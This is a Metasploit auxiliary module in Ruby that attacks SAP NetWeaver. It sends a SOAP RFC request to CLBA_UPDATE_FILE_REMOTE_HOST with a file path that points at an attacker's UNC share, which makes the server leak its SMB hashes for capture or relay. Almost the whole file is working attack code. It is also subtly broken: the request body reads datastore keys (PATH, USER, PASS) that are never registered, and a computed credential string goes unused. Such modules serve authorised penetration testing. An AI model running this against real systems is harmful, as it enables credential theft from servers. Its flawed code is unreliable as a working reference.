##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name' => 'SAP SOAP RFC CLBA_UPDATE_FILE_REMOTE_HOST SMB Relay',
			'Description' => %q{
				This module abuses the SAP NetWeaver CLBA_UPDATE_FILE_REMOTE_HOST function
				to capture SMB hashes by using a fake SMB share as FILEPATH.
				},
			'References' => [['URL','http://labs.mwrinfosecurity.com']],
			'Author' => ['nmonkee'],
			'License' => MSF_LICENSE
			)

		register_options([
			OptString.new('CLIENT', [true, 'SAP client', nil]),
			OptString.new('USERNAME', [true, 'Username', nil]),
			OptString.new('PASSWORD', [true, 'Password', nil]),
			OptString.new('FILEPATH',[true,'File path (e.g. \\\\xx.xx.xx.xx\\filename)',nil]),
			], self.class)
	end

	def run_host(ip)
		data = '<?xml version="1.0" encoding="utf-8" ?>'
		data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  '
		data << 'xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  '
		data << 'xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">'
		data << '<SOAP-ENV:Header/>'
		data << '<SOAP-ENV:Body>'
		data << '<n1:CLBA_UPDATE_FILE_REMOTE_HOST xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
		data << '<DATA_TAB>'
		data << '<item>'
		data << '<TABNAME>a</TABNAME>'
		data << '<NUMBER>0</NUMBER>'
		data << '<TEXT>a</TEXT>'
		data << '<COLOR>a</COLOR>'
		data << '<DATA>a</DATA>'
		data << '</item>'
		data << '</DATA_TAB>'
		data << '<FILE_NAME>' + datastore['PATH'] + '</FILE_NAME>'
		data << '</n1:CLBA_UPDATE_FILE_REMOTE_HOST>'
		data << '</SOAP-ENV:Body>'
		data << '</SOAP-ENV:Envelope>'
		user_pass = Rex::Text.encode_base64(datastore['USER'] + ":" + datastore['PASS'])
		begin
			vprint_status("[SAP] #{ip}:#{rport} - Sending request for #{datastore['FILEPATH']}")
			res = send_request_cgi({
				'uri' => '/sap/bc/soap/rfc',
				'method' => 'POST',
				'data' => data,
				'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
				'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
				'ctype' => 'text/xml; charset=UTF-8',
				'headers' => {
					'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
				},
				'vars_get' => {
					'sap-client' => datastore['CLIENT'],
					'sap-language' => 'EN'
				}
			})
			if res
					vprint_status("[SAP] #{rhost}:#{rport} - Error code: " + res.code.to_s)
					vprint_status("[SAP] #{rhost}:#{rport} - Error title: " + res.message.to_s)
					vprint_status("[SAP] #{rhost}:#{rport} - Error message: " + res.body.to_s)
			end
			rescue ::Rex::ConnectionError
				print_error("#{rhost}:#{rport} - Unable to connect")
				return
			end
		end
	end
